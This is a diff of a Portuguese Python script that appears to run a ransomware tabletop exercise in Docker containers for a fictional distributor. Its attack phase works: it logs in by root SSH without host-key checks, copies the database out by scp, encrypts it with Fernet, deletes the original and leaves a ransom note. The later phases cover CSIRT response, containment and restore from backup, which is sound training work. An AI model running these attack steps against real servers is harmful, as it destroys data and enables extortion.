@@ -1,25 +1,31 @@
+"""
+CENARIO 1 - Ataque de Ransomware com criptografia Fernet (AES)
+CLT Distribuidora S.A.
+
+Executar de dentro do container atacante via PuTTY:
+  python3 /scripts/cenario1_ransomware.py
+
+Na producao, monitorar em tempo real:
+  tail -f /app/logs/incidente.log
+"""
+
 import subprocess, time, datetime, os
 from cryptography.fernet import Fernet
 
+# ── Cores ────────────────────────────────────────────────────
 class C:
     R ="\033[0m"
-    V ="\033[92m"   # verde
-    A ="\033[93m"   # amarelo
-    E ="\033[91m"   # vermelho
-    CI="\033[96m"   # ciano
-    B ="\033[1m"    # negrito
+    V ="\033[92m"
+    A ="\033[93m"
+    E ="\033[91m"
+    CI="\033[96m"
+    B ="\033[1m"
 
 def log(msg, cor=C.R, pre=""):
     h = datetime.datetime.now().strftime("%H:%M:%S")
     print(f"{cor}{pre}[{h}] {msg}{C.R}")
     with open("/logs/cenario1.log", "a") as f:
         f.write(f"[{h}] {msg}\n")
-
-def log_producao(msg, nivel="INFO"):
-    """Escreve log visivel no terminal da producao via SSH."""
-    h = datetime.datetime.now().strftime("%H:%M:%S")
-    entrada = f"[{h}] [{nivel}] {msg}"
-    exec_ssh("srv-producao", f"echo '{entrada}' >> /app/logs/incidente.log")
 
 def sep(titulo="", cor=C.CI):
     linha = "=" * 58
@@ -34,6 +40,7 @@ def aguardar(msg="Pressione ENTER para continuar..."):
     input()
 
 def exec_ssh(host, cmd):
+    """Uma conexao SSH, um ou varios comandos encadeados com &&."""
     r = subprocess.run(
         ["ssh", "-o", "StrictHostKeyChecking=no",
          "-p", "22", f"root@{host}", cmd],
@@ -41,9 +48,28 @@ def exec_ssh(host, cmd):
     )
     return r.stdout.strip(), r.returncode
 
+def exec_scp_baixar(host, origem, destino):
+    """Copia arquivo do container para o atacante."""
+    r = subprocess.run(
+        ["scp", "-o", "StrictHostKeyChecking=no",
+         f"root@{host}:{origem}", destino],
+        capture_output=True, text=True
+    )
+    return r.returncode
+
+def exec_scp_enviar(host, origem, destino):
+    """Copia arquivo do atacante para o container."""
+    r = subprocess.run(
+        ["scp", "-o", "StrictHostKeyChecking=no",
+         origem, f"root@{host}:{destino}"],
+        capture_output=True, text=True
+    )
+    return r.returncode
+
 os.makedirs("/logs", exist_ok=True)
 open("/logs/cenario1.log", "w").close()
 
+# ════════════════════════════════════════════════════════════
 sep("CENARIO 1 - ATAQUE DE RANSOMWARE", C.CI)
 log("CLT Distribuidora S.A. - Simulacao de Incidente P1")
 log("Stack: Alpine Linux 3.19 + Fernet (AES-128) + Docker")
@@ -51,193 +77,200 @@ log(f"Atacante: srv-atacante", C.CI)
 log(f"Alvo:     srv-producao", C.E, ">>> ")
 print(f"\n  {C.A}Abra o PuTTY da producao e rode:{C.R}")
 print(f"  {C.B}tail -f /app/logs/incidente.log{C.R}\n")
+aguardar("Producao monitorando? ENTER para iniciar...")
 
-aguardar("Producao monitorando? Pressione ENTER para iniciar...")
-
+# ════════════════════════════════════════════════════════════
+# FASE 1 - 1 conexao SSH (leitura + logs)
+# ════════════════════════════════════════════════════════════
 sep("FASE 1 - SITUACAO NORMAL")
-
-log_producao("Sistema CRM operando normalmente", "OK")
-log_producao("Equipe de vendas registrando pedidos", "OK")
-
 log("Verificando estado do servidor alvo...", C.V)
 time.sleep(1)
 
-out, _ = exec_ssh("srv-producao", "sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM clientes;'")
-log(f"Clientes em srv-producao: {out}", C.V)
-log_producao(f"Banco de dados ativo - {out} clientes cadastrados", "OK")
+CMD_FASE1 = (
+    "echo '[OK] Sistema CRM operando normalmente' >> /app/logs/incidente.log && "
+    "echo '[OK] Equipe de vendas registrando pedidos' >> /app/logs/incidente.log && "
+    "sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM clientes;' && "
+    "sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM pedidos;' && "
+    "ls -lh /app/banco/clt.db"
+)
+out, _ = exec_ssh("srv-producao", CMD_FASE1)
+linhas = out.split("\n")
 
-out, _ = exec_ssh("srv-producao", "sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM pedidos;'")
-log(f"Pedidos ativos em srv-producao: {out}", C.V)
-log_producao(f"Pedidos ativos: {out}", "OK")
+clientes = linhas[0] if len(linhas) > 0 else "?"
+pedidos  = linhas[1] if len(linhas) > 1 else "?"
+banco    = linhas[2] if len(linhas) > 2 else "?"
 
-out, _ = exec_ssh("srv-producao", "ls -lh /app/banco/clt.db")
-log(f"Arquivo do banco: {out}", C.V)
+log(f"Clientes em srv-producao: {clientes}", C.V)
+log(f"Pedidos ativos: {pedidos}", C.V)
+log(f"Arquivo do banco: {banco}", C.V)
 
 aguardar("Sistema normal confirmado. ENTER para simular o ataque...")
 
+# ════════════════════════════════════════════════════════════
+# FASE 2 - 1 conexao SCP (baixar) + 1 conexao SSH (comprometer) + 1 SCP (enviar)
+# ════════════════════════════════════════════════════════════
 sep("FASE 2 - ATAQUE DE RANSOMWARE", C.E)
-
 log("Iniciando conexao nao autorizada com srv-producao...", C.A)
-log_producao("ALERTA: conexao suspeita detectada na porta 22", "WARN")
 time.sleep(1)
-
 log("Conexao estabelecida! Mapeando sistema de arquivos...", C.E, "!!! ")
-log_producao("ALERTA: processo desconhecido acessando /app/banco/", "WARN")
 time.sleep(0.8)
 
 log("Gerando chave de criptografia Fernet (AES-128)...", C.A)
-CHAVE = Fernet.generate_key()
+CHAVE  = Fernet.generate_key()
 fernet = Fernet(CHAVE)
 log(f"Chave gerada: {CHAVE.decode()[:40]}...", C.E)
 log("Chave retida pelo atacante - sem ela nao ha recuperacao!", C.E, "!!! ")
 time.sleep(0.5)
-
 with open("/logs/chave_ransomware.key", "wb") as f:
     f.write(CHAVE)
 
 aguardar("ENTER para criptografar o banco de dados...")
 
+# SCP 1: baixar o banco (1 senha)
 log("Baixando banco de dados de srv-producao...", C.A)
-log_producao("CRITICO: transferencia de dados detectada - clt.db copiado!", "CRIT")
-time.sleep(1)
-
-r = subprocess.run(
-    ["scp", "-o", "StrictHostKeyChecking=no",
-     "root@srv-producao:/app/banco/clt.db", "/tmp/clt.db"],
-    capture_output=True, text=True
-)
+exec_scp_baixar("srv-producao", "/app/banco/clt.db", "/tmp/clt.db")
 
 if os.path.exists("/tmp/clt.db"):
     log("Banco baixado com sucesso!", C.E, "!!! ")
-
     with open("/tmp/clt.db", "rb") as f:
         dados = f.read()
-
     dados_criptografados = fernet.encrypt(dados)
     log(f"Criptografando {len(dados)} bytes com AES-128...", C.A)
     time.sleep(0.8)
-
     with open("/tmp/clt.db.locked", "wb") as f:
         f.write(dados_criptografados)
-
     log(f"Arquivo criptografado: {len(dados_criptografados)} bytes", C.E)
 
-    subprocess.run(
-        ["scp", "-o", "StrictHostKeyChecking=no",
-         "/tmp/clt.db.locked", "root@srv-producao:/app/banco/clt.db.locked"],
-        capture_output=True
+    # SCP 2: enviar o banco criptografado (1 senha)
+    exec_scp_enviar("srv-producao", "/tmp/clt.db.locked", "/app/banco/clt.db.locked")
+
+    # SSH: remover banco original, criar nota, registrar logs — tudo em 1 conexao (1 senha)
+    CMD_COMPROMETER = (
+        "rm -f /app/banco/clt.db && "
+        "echo 'RANSOMWARE: Pague 10 BTC - hacker@dark.net' > /app/banco/LEIA-ME.txt && "
+        "echo '[CRIT] transferencia de dados detectada!' >> /app/logs/incidente.log && "
+        "echo '[CRIT] /app/banco/clt.db REMOVIDO!' >> /app/logs/incidente.log && "
+        "echo '[CRIT] CRM INDISPONIVEL - banco inacessivel!' >> /app/logs/incidente.log && "
+        "ls /app/banco/"
     )
-    exec_ssh("srv-producao", "rm -f /app/banco/clt.db")
-    exec_ssh("srv-producao",
-        "echo 'RANSOMWARE: Pague 10 BTC' > /app/banco/LEIA-ME.txt")
-
-    log_producao("CRITICO: /app/banco/clt.db REMOVIDO!", "CRIT")
-    log_producao("CRITICO: arquivo clt.db.locked encontrado no sistema!", "CRIT")
-    log_producao("CRITICO: CRM INDISPONIVEL - banco de dados inacessivel!", "CRIT")
-
-    out, _ = exec_ssh("srv-producao", "ls /app/banco/")
+    out, _ = exec_ssh("srv-producao", CMD_COMPROMETER)
     log(f"Estado do banco em srv-producao:\n    {out}", C.E)
 
 log("SISTEMA COMPROMETIDO - CRM INDISPONIVEL", C.E, "!!! ")
-log("Mensagem do atacante: Pague 10 BTC para recuperar seus dados", C.E, "!!! ")
-
+log("Mensagem: Pague 10 BTC para recuperar seus dados", C.E, "!!! ")
 aguardar("ENTER para acionar o CSIRT...")
 
+# ════════════════════════════════════════════════════════════
+# FASE 3 - 1 conexao SSH (logs do CSIRT)
+# ════════════════════════════════════════════════════════════
 sep("FASE 3 - ACIONAMENTO DO CSIRT", C.A)
-
-log_producao("CSIRT acionado - incidente P1 confirmado", "CSIRT")
-log_producao("Canal de crise aberto: #incidente-p1-ransomware", "CSIRT")
-
 log("Coordenador de Incidentes acionado", C.A)
 log("Canal de crise: #incidente-p1-ransomware", C.A)
 log("DPO notificado - possivel exposicao de dados pessoais", C.A)
-log(f"Timestamp: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", C.A)
-log_producao(f"Timestamp oficial do incidente: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", "CSIRT")
+ts = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+log(f"Timestamp: {ts}", C.A)
 
+CMD_CSIRT = (
+    f"echo '[CSIRT] Incidente P1 confirmado' >> /app/logs/incidente.log && "
+    f"echo '[CSIRT] Canal de crise: #incidente-p1-ransomware' >> /app/logs/incidente.log && "
+    f"echo '[CSIRT] Timestamp oficial: {ts}' >> /app/logs/incidente.log"
+)
+exec_ssh("srv-producao", CMD_CSIRT)
 aguardar("ENTER para iniciar a contencao...")
 
+# ════════════════════════════════════════════════════════════
+# FASE 4 - 1 conexao SSH (isolar + log)
+# ════════════════════════════════════════════════════════════
 sep("FASE 4 - CONTENCAO", C.A)
+log("Isolando srv-producao da rede via iptables...", C.A)
 
-log("Isolando srv-producao da rede interna via iptables...", C.A)
-exec_ssh("srv-producao", "iptables -I INPUT -j DROP && iptables -I OUTPUT -j DROP")
+CMD_CONTENCAO = (
+    "iptables -I INPUT -j DROP && "
+    "iptables -I OUTPUT -j DROP && "
+    "echo '[CONT] Servidor ISOLADO - iptables DROP aplicado' >> /app/logs/incidente.log && "
+    "echo '[CONT] Memoria preservada para forense' >> /app/logs/incidente.log"
+)
+exec_ssh("srv-producao", CMD_CONTENCAO)
 time.sleep(0.5)
-
-log_producao("Servidor ISOLADO da rede - iptables DROP aplicado", "CONT")
 log("srv-producao ISOLADO da rede", C.V)
 log("Integracoes com ERPs suspensas", C.A)
 log("Servidor NAO desligado - memoria preservada para forense", C.CI)
-log_producao("Memoria preservada para analise forense", "CONT")
-
 aguardar("ENTER para restaurar via backup WORM...")
 
+# ════════════════════════════════════════════════════════════
+# FASE 5 - 1 conexao SSH (liberar + verificar + restore + log)
+# ════════════════════════════════════════════════════════════
 sep("FASE 5 - RECUPERACAO VIA BACKUP WORM", C.V)
-
-# Liberar rede para acessar o backup
-exec_ssh("srv-producao", "iptables -F")
-log_producao("Rede restaurada para operacao de restore", "RESTO")
+log("Verificando backup WORM e executando restore...", C.A)
 time.sleep(1)
 
-log("Verificando backup WORM em srv-producao...", C.A)
-time.sleep(1)
-out, code = exec_ssh("srv-producao", "ls -lh /app/backup/")
-if code == 0 and "clt_backup.db" in out:
-    log(f"Backup WORM encontrado!", C.V)
-    log(f"  {out}", C.V)
-    log_producao("Backup WORM localizado em /app/backup/clt_backup.db", "RESTO")
-else:
-    log("ERRO: backup nao encontrado!", C.E)
-    exit(1)
+CMD_RESTORE = (
+    "iptables -F && "
+    "echo '[RESTO] Rede restaurada para operacao de restore' >> /app/logs/incidente.log && "
+    "ls -lh /app/backup/ && "
+    "md5sum /app/backup/clt_backup.db && "
+    "rm -f /app/banco/clt.db.locked /app/banco/LEIA-ME.txt && "
+    "cp /app/backup/clt_backup.db /app/banco/clt.db && "
+    "echo '[RESTO] Backup WORM restaurado com sucesso!' >> /app/logs/incidente.log"
+)
+out, code = exec_ssh("srv-producao", CMD_RESTORE)
+linhas = out.split("\n")
 
-out, _ = exec_ssh("srv-producao", "md5sum /app/backup/clt_backup.db")
-log(f"Hash MD5 verificado: {out}", C.V)
-log_producao(f"Integridade do backup confirmada - MD5: {out[:32]}", "RESTO")
+backup_info = next((l for l in linhas if "clt_backup.db" in l and "total" not in l), "")
+md5_info    = next((l for l in linhas if "clt_backup" in l and "/" in l), "")
 
-aguardar("ENTER para executar o restore...")
+if backup_info:
+    log(f"Backup WORM encontrado: {backup_info}", C.V)
+if md5_info:
+    log(f"Hash MD5 verificado: {md5_info}", C.V)
 
-log("Removendo arquivos comprometidos...", C.A)
-exec_ssh("srv-producao", "rm -f /app/banco/clt.db.locked /app/banco/LEIA-ME.txt")
-log_producao("Arquivos criptografados removidos", "RESTO")
-time.sleep(0.5)
-
-log("Restaurando banco a partir do backup WORM...", C.A)
-exec_ssh("srv-producao", "cp /app/backup/clt_backup.db /app/banco/clt.db")
-time.sleep(0.8)
+log("Arquivos criptografados removidos", C.A)
 log("Restore concluido!", C.V)
-log_producao("Banco de dados restaurado com sucesso!", "RESTO")
+aguardar("ENTER para validar os dados recuperados...")
 
+# ════════════════════════════════════════════════════════════
+# FASE 6 - 1 conexao SSH (validar 3 tabelas + log)
+# ════════════════════════════════════════════════════════════
 sep("FASE 6 - VALIDACAO POS-RESTORE", C.V)
-
-log("Validando integridade dos dados recuperados...", C.A)
-log_producao("Iniciando validacao pos-restore...", "VALID")
+log("Validando integridade dos dados...", C.A)
 time.sleep(1)
 
-todos_ok = True
-for tabela in ["clientes", "pedidos", "catalogo"]:
-    out, _ = exec_ssh("srv-producao",
-        f"sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM {tabela};'")
-    ok = out.strip() == "5"
-    status = f"{C.V}[OK]{C.R}" if ok else f"{C.E}[FALHA]{C.R}"
-    print(f"    {status} Tabela {tabela}: {out} registro(s)")
-    nivel = "OK" if ok else "ERRO"
-    log_producao(f"Tabela {tabela}: {out} registros - {nivel}", nivel)
+CMD_VALIDAR = (
+    "sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM clientes;' && "
+    "sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM pedidos;' && "
+    "sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM catalogo;' && "
+    "echo '[VALID] Validacao concluida' >> /app/logs/incidente.log && "
+    "echo '[OK] Banco 100% integro - patch aplicado' >> /app/logs/incidente.log"
+)
+out, _ = exec_ssh("srv-producao", CMD_VALIDAR)
+contagens = [l for l in out.split("\n") if l.strip().isdigit()]
+tabelas   = ["clientes", "pedidos", "catalogo"]
+todos_ok  = True
+
+for i, tabela in enumerate(tabelas):
+    qtd = contagens[i] if i < len(contagens) else "?"
+    ok  = qtd == "5"
+    st  = f"{C.V}[OK]{C.R}" if ok else f"{C.E}[FALHA]{C.R}"
+    print(f"    {st} Tabela {tabela}: {qtd} registro(s)")
     if not ok:
         todos_ok = False
-    time.sleep(0.4)
+    time.sleep(0.3)
 
 if todos_ok:
     log("Todos os dados validados - banco 100% integro!", C.V)
-    log_producao("Validacao concluida - banco 100% integro!", "OK")
-
 log("Patch de seguranca aplicado", C.V)
-log("Varredura concluida - ambiente limpo", C.V)
-log_producao("Patch aplicado - ambiente liberado para operacao", "OK")
-
 aguardar("ENTER para encerrar o incidente...")
 
+# ════════════════════════════════════════════════════════════
+# FASE 7 - 1 conexao SSH (log final)
+# ════════════════════════════════════════════════════════════
 sep("FASE 7 - ENCERRAMENTO", C.CI)
 
-log_producao("CRM liberado para os usuarios", "OK")
-log_producao("Notificacao ANPD preparada - prazo 72h iniciado", "LGPD")
+CMD_ENCERRAR = (
+    "echo '[OK] CRM liberado para os usuarios' >> /app/logs/incidente.log && "
+    "echo '[LGPD] Notificacao ANPD preparada - prazo 72h iniciado' >> /app/logs/incidente.log"
+)
+exec_ssh("srv-producao", CMD_ENCERRAR)
 
 log("Notificacao preparada para ANPD - prazo 72h (LGPD Art. 48)", C.A)
 log("Equipe comercial informada - CRM disponivel", C.V)
@@ -249,6 +282,6 @@ log("Downtime: dentro do RTO de 4h definido na BIA", C.V)
 log("Dados recuperados: 100% via backup WORM", C.V)
 log("Criptografia real: Fernet AES-128", C.V)
 log("Chave do atacante salva em: /logs/chave_ransomware.key", C.CI)
-log("Log do atacante: /logs/cenario1.log", C.CI)
-log("Log da producao: /app/logs/incidente.log", C.CI)
+log("Log do atacante:  /logs/cenario1.log", C.CI)
+log("Log da producao:  /app/logs/incidente.log", C.CI)
 print()
